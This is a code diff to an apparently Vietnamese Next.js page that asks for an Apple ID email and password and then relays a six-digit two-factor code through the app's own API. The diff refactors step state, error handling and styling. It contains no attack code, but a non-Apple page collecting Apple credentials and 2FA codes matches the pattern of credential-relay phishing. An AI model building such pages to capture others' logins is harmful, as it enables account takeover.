@@ -1,16 +1,21 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useRouter } from 'next/router';
 
 export default function AuthPage() {
-  const [step, setStep] = useState(1); // 1: Login, 2: 2FA
+  const [step, setStep] = useState<'login' | 'verify'>('login');
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [code, setCode] = useState('');
   const [error, setError] = useState('');
   const [dsid, setDsid] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const [verifyMessage, setVerifyMessage] = useState('');
+  const [verifyInfo, setVerifyInfo] = useState({ message: '', type: '' });
   const router = useRouter();
+
+  useEffect(() => {
+    // Reset lỗi khi chuyển step
+    setError('');
+  }, [step]);
 
   const handleLogin = async () => {
     setIsLoading(true);
@@ -23,12 +28,15 @@ export default function AuthPage() {
       });
 
       const data = await response.json();
-      console.log('API Response:', data);
+      console.log('Full login response:', data); // Debug chi tiết
 
       if (data.requires2FA) {
         setDsid(data.dsid);
-        setVerifyMessage(data.message || 'Vui lòng nhập mã xác minh 6 chữ số');
-        setStep(2); // Chuyển sang bước 2FA
+        setVerifyInfo({
+          message: data.message,
+          type: data.authType
+        });
+        setStep('verify');
       } else if (data.success) {
         router.push('/');
       } else {
@@ -36,6 +44,7 @@ export default function AuthPage() {
       }
     } catch (err) {
       setError('Lỗi kết nối máy chủ');
+      console.error('Login error:', err);
     } finally {
       setIsLoading(false);
     }
@@ -55,7 +64,11 @@ export default function AuthPage() {
       if (data.success) {
         router.push('/');
       } else {
-        setError(data.error || 'Xác thực thất bại');
+        setError(data.error || 'Xác thực thất bại. Vui lòng thử lại.');
+        // Tự động quay lại form login nếu lỗi nặng
+        if (data.error?.includes('session')) {
+          setStep('login');
+        }
       }
     } catch (err) {
       setError('Lỗi kết nối máy chủ');
@@ -66,23 +79,19 @@ export default function AuthPage() {
 
   return (
     <div className="min-h-screen flex items-center justify-center bg-gray-50 p-4">
-      <div className="w-full max-w-md bg-white rounded-lg shadow-md overflow-hidden">
-        {/* Step 1: Login Form */}
-        {step === 1 && (
+      <div className="w-full max-w-md bg-white rounded-lg shadow-md overflow-hidden transition-all">
+        {/* Login Form */}
+        {step === 'login' && (
           <div className="p-6 space-y-4">
             <h1 className="text-2xl font-bold text-center">Đăng nhập Apple ID</h1>
             
-            {error && (
-              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded">
-                {error}
-              </div>
-            )}
+            {error && <div className="p-3 bg-red-100 text-red-700 rounded">{error}</div>}
 
             <div>
-              <label className="block mb-2 text-sm font-medium">Apple ID</label>
               <input
                 type="email"
-                className="w-full p-2 border rounded"
+                className="w-full p-3 border rounded"
+                placeholder="Apple ID"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 disabled={isLoading}
@@ -90,10 +99,10 @@ export default function AuthPage() {
             </div>
 
             <div>
-              <label className="block mb-2 text-sm font-medium">Mật khẩu</label>
               <input
                 type="password"
-                className="w-full p-2 border rounded"
+                className="w-full p-3 border rounded"
+                placeholder="Mật khẩu"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 disabled={isLoading}
@@ -103,54 +112,53 @@ export default function AuthPage() {
             <button
               onClick={handleLogin}
               disabled={isLoading}
-              className={`w-full py-2 px-4 rounded text-white ${isLoading ? 'bg-blue-400' : 'bg-blue-600 hover:bg-blue-700'}`}
+              className={`w-full p-3 rounded text-white ${
+                isLoading ? 'bg-blue-400' : 'bg-blue-600 hover:bg-blue-700'
+              }`}
             >
-              {isLoading ? 'Đang xử lý...' : 'Đăng nhập'}
+              {isLoading ? 'Đang đăng nhập...' : 'Tiếp tục'}
             </button>
           </div>
         )}
 
-        {/* Step 2: 2FA Form */}
-        {step === 2 && (
+        {/* 2FA Form - Luôn hiển thị nếu step === 'verify' */}
+        {step === 'verify' && (
           <div className="p-6 space-y-4">
-            <h1 className="text-2xl font-bold text-center">Xác thực 2 bước</h1>
+            <h1 className="text-2xl font-bold text-center">Xác thực 2 yếu tố</h1>
             
-            {error && (
-              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded">
-                {error}
-              </div>
-            )}
+            {error && <div className="p-3 bg-red-100 text-red-700 rounded">{error}</div>}
 
-            <div className="bg-blue-100 border-l-4 border-blue-500 p-4">
-              <p>{verifyMessage}</p>
+            <div className="p-4 bg-blue-50 border-l-4 border-blue-500 rounded">
+              <p>{verifyInfo.message || 'Vui lòng nhập mã xác minh 6 số'}</p>
             </div>
 
             <div>
-              <label className="block mb-2 text-sm font-medium">Mã xác minh</label>
               <input
                 type="text"
                 inputMode="numeric"
                 pattern="[0-9]*"
                 maxLength={6}
-                className="w-full p-2 border rounded text-center text-xl"
+                className="w-full p-3 border rounded text-center text-xl tracking-widest"
+                placeholder="Mã 6 số"
                 value={code}
                 onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
                 disabled={isLoading}
-                placeholder="123456"
               />
             </div>
 
             <button
               onClick={handleVerify}
               disabled={isLoading || code.length !== 6}
-              className={`w-full py-2 px-4 rounded text-white ${isLoading ? 'bg-green-400' : 'bg-green-600 hover:bg-green-700'}`}
+              className={`w-full p-3 rounded text-white ${
+                isLoading ? 'bg-green-400' : 'bg-green-600 hover:bg-green-700'
+              }`}
             >
-              {isLoading ? 'Đang xác thực...' : 'Xác nhận'}
+              {isLoading ? 'Đang xác minh...' : 'Xác nhận'}
             </button>
 
             <button
-              onClick={() => setStep(1)}
-              className="w-full py-2 px-4 bg-gray-200 rounded hover:bg-gray-300"
+              onClick={() => setStep('login')}
+              className="w-full p-3 bg-gray-100 hover:bg-gray-200 rounded"
             >
               Quay lại
             </button>
